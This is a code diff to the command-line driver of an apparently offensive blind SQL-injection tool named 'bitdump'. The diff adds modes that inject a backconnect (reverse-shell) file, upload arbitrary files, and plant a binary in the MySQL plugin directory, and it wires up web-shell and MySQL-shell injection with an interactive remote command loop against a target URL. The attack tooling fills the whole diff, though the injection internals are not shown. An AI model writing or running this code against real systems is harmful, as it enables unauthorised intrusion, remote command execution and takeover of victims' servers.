@@ -39,13 +39,77 @@ class Printer:
                 self.printToFile("%s: %s" % (column, value), 1)
             self.printToFile("")
 
+def runShell(shell):
+    output = shell.prompt()
+    done = False
+    while not done:
+        cmd = input(output)
+        if cmd == "exit":
+            print("[bitdump] exiting")
+            done = True
+        else:
+            output = shell.execute(cmd)
+
+
 if __name__ == '__main__':
     p = parsing.Parser()
     
     verbosity = 0 if p.args.verbose is None else p.args.verbose
     printer = Printer(verbosity, p.args.outfile)
 
-    if p.args.shell is not None:
+    if p.args.backconnect is not None:
+        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
+        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))
+        try:
+            print("Loading injector...")
+            injector = injection.Injector(p.args.url, p.args.success, p.args.delay, p.args.attack_field, p.parseOtherFields(), stringExecutor, charExecutor)
+        except injection.InjectionError:
+            print("Failed injection! Are you sure your settings are correct?")
+            exit(ERR_INJECTION)
+        except injection.TimeoutLimitError as e:
+            print("Unable to reach %s -- check your internet connection and ensure your target is correct." % e.url)
+            exit(ERR_TIMEOUT)
+        else:
+            injector.injectFile(p.args.backconnect[0], p.args.backconnect[1], p.args.backconnect[2], p.args.backconnect[3])
+        finally:
+            stringExecutor.shutdown()
+            charExecutor.shutdown()
+    elif p.args.upload is not None:
+        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
+        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))
+        try:
+            print("Loading injector...")
+            injector = injection.Injector(p.args.url, p.args.success, p.args.delay, p.args.attack_field, p.parseOtherFields(), stringExecutor, charExecutor)
+        except injection.InjectionError:
+            print("Failed injection! Are you sure your settings are correct?")
+            exit(ERR_INJECTION)
+        except injection.TimeoutLimitError as e:
+            print("Unable to reach %s -- check your internet connection and ensure your target is correct." % e.url)
+            exit(ERR_TIMEOUT)
+        else:
+            injector.injectFile(p.args.upload[0], p.args.upload[1])
+        finally:
+            stringExecutor.shutdown()
+            charExecutor.shutdown()
+    elif p.args.trybin is not None:
+        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
+        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))
+        try:
+            print("Loading injector...")
+            injector = injection.Injector(p.args.url, p.args.success, p.args.delay, p.args.attack_field, p.parseOtherFields(), stringExecutor, charExecutor)
+        except injection.InjectionError:
+            print("Failed injection! Are you sure your settings are correct?")
+            exit(ERR_INJECTION)
+        except injection.TimeoutLimitError as e:
+            print("Unable to reach %s -- check your internet connection and ensure your target is correct." % e.url)
+            exit(ERR_TIMEOUT)
+        else:
+            injector.injectBinFile(p.args.trybin, "/usr/lib64/mysql/plugin/test.so")
+        finally:
+            stringExecutor.shutdown()
+            charExecutor.shutdown()
+
+    elif p.args.shell is not None or p.args.shell_mysql is not None:
         stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
         charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))
         try:
@@ -59,19 +123,12 @@ if __name__ == '__main__':
             exit(ERR_TIMEOUT)
         else:
             print("Generating shell...")
-            shell = injector.injectPHPShell(p.args.shell)
+            shell = (injector.injectShell(p.args.shell) if p.args.shell is not None
+                    else injector.injectMySQLShell(p.args.shell_mysql[0], p.args.shell_mysql[1], p.args.shell_mysql[2], p.args.shell_mysql[3], p.args.shell_mysql[4]))
         finally:
             stringExecutor.shutdown()
             charExecutor.shutdown()
-        output = shell.prompt()
-        done = False
-        while not done:
-            cmd = input(output)
-            if cmd == "exit":
-                print("[bitdump] exiting")
-                done = True
-            else:
-                output = shell.execute(cmd)
+        runShell(shell)
     elif p.args.file is None:
         stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.1), 1))
         charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.8), 1))
